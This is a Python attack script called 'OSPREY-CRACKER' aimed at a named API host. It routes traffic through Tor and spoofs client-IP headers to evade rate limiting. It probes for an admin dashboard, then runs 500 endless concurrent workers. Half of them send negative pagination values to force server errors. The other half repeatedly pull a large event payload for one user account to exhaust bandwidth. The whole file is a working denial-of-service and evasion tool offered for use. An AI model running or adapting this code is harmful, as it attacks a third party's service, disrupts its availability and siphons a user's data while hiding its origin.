import asyncio
import httpx
import random
import time

# --- CONFIG ---
API_BASE_URL = "https://api.gms-admin.net"
API_V1 = f"{API_BASE_URL}/api/v1"
WHALE_ACID = 1260760
TOR_PROXY = "socks5://127.0.0.1:9050"
CONCURRENT_REQUESTS = 500 
TIMEOUT = 120

BYPASS_HEADERS = [
    "X-Real-IP", "X-Client-IP", "True-Client-IP", "CF-Connecting-IP",
    "X-Originating-IP", "X-Forwarded-For", "Forwarded-For"
]

def get_spoofed_headers():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    header_name = random.choice(BYPASS_HEADERS)
    return {header_name: ip, "User-Agent": "OspreyBounty-Scanner-v3"}

async def probe_dashboard_deep(client):
    """302 Found means the route exists but is likely protected by a session."""
    print("[*] Verifying Dashboard presence...")
    path = "/dashboard/"
    try:
        resp = await client.get(f"{API_BASE_URL}{path}", timeout=10, follow_redirects=False)
        if resp.status_code in [200, 302, 301, 308]:
            print(f"\n[!!!] CONFIRMED: Dashboard exists at {path} (Status {resp.status_code})")
            if "location" in resp.headers:
                print(f"[*] Redirects to: {resp.headers['location']}\n")
    except Exception as e:
        print(f"[-] Dashboard probe failed: {e}")

async def hammer_logic_bomb(client, worker_id):
    """
    CRITICAL FIX: We must use page >= 2 so that (page-1) * per_page results 
    in a negative number, triggering the PyMongo ValueError.
    """
    url = f"{API_V1}/online"
    while True:
        try:
            # (2 - 1) * -100 = -100. This WILL trigger the 500 error.
            params = {'page': random.randint(2, 100), 'per_page': -100}
            
            resp = await client.get(url, params=params, headers=get_spoofed_headers(), timeout=TIMEOUT)
            
            if resp.status_code == 500:
                print(f"[W{worker_id}][PANIC] Triggered 500 Error (Negative Skip Successful)")
            elif resp.status_code == 429:
                await asyncio.sleep(0.1)
            elif resp.status_code == 200:
                # If it's 200, they actually patched it or have a WAF filtering negatives
                print(f"[W{worker_id}] Logic Bomb neutralized by server.")
        except Exception:
            await asyncio.sleep(0.5)

async def hammer_whale_bandwidth(client, worker_id):
    """Keeps the pipes full with the 2.29MB event payload."""
    url = f"{API_V1}/users/{WHALE_ACID}/events"
    while True:
        try:
            resp = await client.get(url, params={'t': time.time()}, headers=get_spoofed_headers(), timeout=TIMEOUT)
            if resp.status_code == 200:
                print(f"[W{worker_id}][WHALE] 2.29MB Siphoned")
            elif resp.status_code == 429:
                await asyncio.sleep(0.5)
        except Exception:
            await asyncio.sleep(1)

async def main():
    print(f"--- OSPREY-CRACKER: LOGIC CORRECTED ---")
    
    limits = httpx.Limits(max_keepalive_connections=100, max_connections=CONCURRENT_REQUESTS)
    async with httpx.AsyncClient(proxy=TOR_PROXY, limits=limits, timeout=None) as client:
        await probe_dashboard_deep(client)
        
        tasks = []
        for i in range(CONCURRENT_REQUESTS):
            if i % 2 == 0:
                tasks.append(hammer_logic_bomb(client, i))
            else:
                tasks.append(hammer_whale_bandwidth(client, i))
                
        print(f"[*] Bombardment Started...")
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Test stopped.")